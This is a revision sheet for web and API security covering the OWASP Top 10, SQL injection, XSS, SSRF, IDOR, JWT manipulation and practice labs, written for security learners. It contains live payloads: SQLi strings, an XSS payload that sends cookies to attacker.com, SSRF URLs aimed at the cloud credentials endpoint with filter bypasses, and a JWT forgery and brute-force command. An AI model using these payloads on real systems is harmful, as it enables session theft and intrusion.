# Month 8 — Web Application & API Security: Quick Revision Notes

## OWASP Top 10 (2021) at a Glance

| Rank | Category | Example Attack | Quick Fix |
|---|---|---|---|
| A01 | Broken Access Control | IDOR, forced browsing | Server-side authz on every request |
| A02 | Cryptographic Failures | Plaintext passwords, weak TLS | AES-256, TLS 1.2+, bcrypt |
| A03 | Injection | SQLi, command injection | Parameterised queries, input validation |
| A04 | Insecure Design | No rate limiting, no abuse cases | Threat modelling, secure design patterns |
| A05 | Security Misconfiguration | Default creds, verbose errors | Hardening checklists, disable debug |
| A06 | Vulnerable Components | Outdated Log4j, jQuery | SCA tools, Dependabot |
| A07 | Auth Failures | Credential stuffing, weak JWT | MFA, bcrypt, short-lived tokens |
| A08 | Software Integrity Failures | Malicious npm packages | Verify signatures, lock files |
| A09 | Logging Failures | No audit log, no SIEM | Log all auth events, centralise logs |
| A10 | SSRF | Reach cloud IMDS at 169.254.169.254 | Allowlist, block internal ranges |

## SQL Injection

```sql
-- Classic UNION-based
' UNION SELECT username, password, NULL FROM users--

-- Boolean-based blind
' AND 1=1--   (true)
' AND 1=2--   (false)

-- Time-based blind (MySQL)
' AND SLEEP(5)--

-- Vulnerable code (Python)
query = "SELECT * FROM users WHERE id = " + user_input  # BAD

-- Safe code (parameterised)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))  # GOOD
```

## Cross-Site Scripting (XSS)

| Type | How it works | Where to look |
|---|---|---|
| Reflected | Payload in URL param, echoed back immediately | Search boxes, error messages |
| Stored | Payload saved in DB, rendered for all users | Comments, profile fields |
| DOM-based | JavaScript reads attacker data into DOM | `document.location`, `innerHTML` |

```html
<!-- Common payloads -->
<script>alert(1)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=fetch('https://attacker.com/?c='+document.cookie)>

<!-- CSP bypass via JSONP -->
"><script src="https://trusted.cdn.com/jsonp?callback=alert(1)"></script>
```

**Defence:** Content Security Policy (CSP), `X-XSS-Protection`, output encoding, `HttpOnly` and `Secure` cookie flags.

## Server-Side Request Forgery (SSRF)

- Attacker tricks server into making HTTP requests to arbitrary internal URLs
- Target: cloud IMDS endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- AWS IMDSv1 returns IAM role credentials with no authentication

```
# Direct SSRF
https://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Bypass filters with alternative representations
http://0x7f000001/          (127.0.0.1 in hex)
http://2130706433/          (127.0.0.1 as decimal)
http://localhost/            
http://[::1]/               (IPv6 loopback)
```

**Defence:** Allowlist permitted URLs/domains, block private IP ranges at network level, use IMDSv2 (token-based).

## Broken Access Control / IDOR

```http
# IDOR example — change user ID in request
GET /api/users/1042/profile HTTP/1.1   # Your account
GET /api/users/1041/profile HTTP/1.1   # Another user's data — same response?

# Horizontal privilege escalation
POST /api/orders/delete
{"order_id": 9999}   # Does this delete another user's order?

# Mass assignment — sending extra fields not in schema
POST /api/users/update
{"name": "Alice", "role": "admin"}  # Accepted and persisted?
```

## Burp Suite Workflow

```
1. Proxy → set browser to 127.0.0.1:8080
2. Target → Site Map: browse app to discover endpoints
3. Repeater: manually craft and replay requests
4. Intruder: automate fuzzing / brute-forcing
5. Scanner (Pro): automated vuln detection
6. Decoder: encode/decode Base64, URL, hex
7. Comparer: diff two responses to spot differences
```

## API Security Key Issues

| Issue | Description | Tool to Find |
|---|---|---|
| BOLA/IDOR | Access other users' objects by changing ID | Burp Repeater, manual |
| Broken Auth | Weak JWT signing (alg:none), no expiry | jwt.io, Burp |
| Excessive Data | API returns more fields than client displays | Intercept + compare |
| Mass Assignment | Extra fields in request body accepted | Burp Intruder |
| Rate Limiting | No throttle on auth or sensitive endpoints | Burp Intruder |

## JWT Manipulation

```
# JWT structure: header.payload.signature (base64url encoded)
eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIG

# Attack 1: alg:none (no signature required)
{"alg":"none"}.{"role":"admin"}.   (empty sig)

# Attack 2: HS256 secret brute-force
hashcat -a 0 -m 16500 token.txt wordlist.txt

# Attack 3: RS256 → HS256 (key confusion)
# If server uses public key as HMAC secret after algo swap
```

## DVWA / Juice Shop Labs

- **DVWA**: PHP app with configurable difficulty — start Low, move to Medium
  - SQL Injection, XSS, CSRF, Command Injection, File Upload modules
  - URL: `http://localhost/dvwa` after setup
- **OWASP Juice Shop**: Node.js modern app with 100+ challenges
  - Scoreboard at `/score-board` (count as finding it as a challenge!)
  - Run: `docker run -p 3000:3000 bkimminich/juice-shop`
